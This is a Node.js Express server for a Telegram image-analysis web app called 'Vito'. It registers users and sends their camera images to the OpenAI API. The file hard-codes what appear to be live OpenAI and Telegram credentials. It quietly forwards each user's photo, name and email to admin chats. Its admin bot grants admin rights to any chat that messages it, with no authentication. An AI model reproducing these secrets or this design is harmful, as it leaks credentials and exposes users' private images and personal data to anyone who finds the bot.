const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

const DB_FILE = './database.json';
const OPENAI_API_KEY = "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";

const USER_BOT_TOKEN = "8887008089:AAHdAkySRNptjORNPiXJH-wB9DRPJ_w0H-w";
const ADMIN_BOT_TOKEN = "8886771952:AAGZRZq_vloOnohWwfjaAb8Sr7yl7QXtkQ8";

const userBot = new TelegramBot(USER_BOT_TOKEN, { polling: true });
const adminBot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });

if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ users: [], blocked: [] }));
}
let db = JSON.parse(fs.readFileSync(DB_FILE));

function saveDB() { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }

app.get('/api/check-user', (req, res) => {
    const email = req.query.email;
    res.json({ blocked: db.blocked.includes(email) });
});

app.post('/api/register', (req, res) => {
    const { fullName, email, birthDate, gender } = req.body;
    if (db.blocked.includes(email)) return res.status(403).send("Blocked");
    
    if (!db.users.find(u => u.email === email)) {
        db.users.push({ fullName, email, birthDate, gender });
        saveDB();
        sendToAllAdmins(`🆕 משתמש חדש נרשם באתר!\nשם: ${fullName}\nאימייל: ${email}\nתאריך לידה: ${birthDate}\nמגדר: ${gender}`);
    }
    res.sendStatus(200);
});

// ניתוח תמונה ושליחתה לבוט ניהול
app.post('/api/analyze', async (req, res) => {
    const { image, prompt, email } = req.body;
    try {
        const response = await axios.post('https://api.openai.com/v1/chat/completions', {
            model: "gpt-4o-mini",
            messages: [
                {
                    role: "user",
                    content: [
                        { type: "text", text: prompt },
                        { type: "image_url", image_url: { url: `data:image/jpeg;base64,${image}` } }
                    ]
                }
            ],
            max_tokens: 30
        }, { headers: { 'Authorization': `Bearer ${OPENAI_API_KEY}` } });

        const result = response.data.choices[0].message.content.trim();
        res.json({ result });

        // שליחת התמונה לבוט הניהול למניעת שימוש לרעה
        const user = db.users.find(u => u.email === email) || { fullName: "אורח לא רשום", email: email || "לא ידוע" };
        const buffer = Buffer.from(image, 'base64');
        
        sendPhotoToAdmins(buffer, `👁️ סריקה חדשה בוצעה!\n👤 משתמש: ${user.fullName}\n📧 מייל: ${user.email}\n🤖 זיהוי AI: *${result}*`);

    } catch (e) { res.status(500).json({ error: "API Error" }); }
});

userBot.onText(/\/start/, (msg) => {
    const lang = msg.from.language_code === 'he' ? 'he' : 'en';
    const welcomeText = lang === 'he' ? "ברוכים הבאים ל-Vito!" : "Welcome to Vito!";
    const btnText = lang === 'he' ? "👁️ פתח את Vito האפליקציה" : "👁️ Open Vito App";

    userBot.sendMessage(msg.chat.id, welcomeText, {
        reply_markup: { inline_keyboard: [[{ text: btnText, web_app: { url: "https://pyldmkdj-star.github.io/Vito" } }]] }
    });
});

let adminChatIds = new Set();
adminBot.onText(/\/start/, (msg) => {
    adminChatIds.add(msg.chat.id);
    adminBot.sendMessage(msg.chat.id, "בוט ניהול Vito פעיל!");
});

function sendToAllAdmins(text) { adminChatIds.forEach(id => adminBot.sendMessage(id, text)); }

// פונקציה מיוחדת לשליחת התמונה המצולמת לניהול
function sendPhotoToAdmins(photoBuffer, caption) {
    adminChatIds.forEach(id => {
        adminBot.sendPhoto(id, photoBuffer, { caption: caption, parse_mode: 'Markdown' }).catch(() => {});
    });
}

adminBot.on('message', (msg) => {
    adminChatIds.add(msg.chat.id);
    const text = msg.text || "";
    if (text.startsWith("חסימה ")) {
        const email = text.replace("חסימה ", "").trim();
        if (!db.blocked.includes(email)) { db.blocked.push(email); saveDB(); adminBot.sendMessage(msg.chat.id, `🚫 חסום: ${email}`); }
    }
    if (text.startsWith("ביטול חסימה ")) {
        const email = text.replace("ביטול חסימה ", "").trim();
        db.blocked = db.blocked.filter(e => e !== email); saveDB(); adminBot.sendMessage(msg.chat.id, `✅ שוחרר: ${email}`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
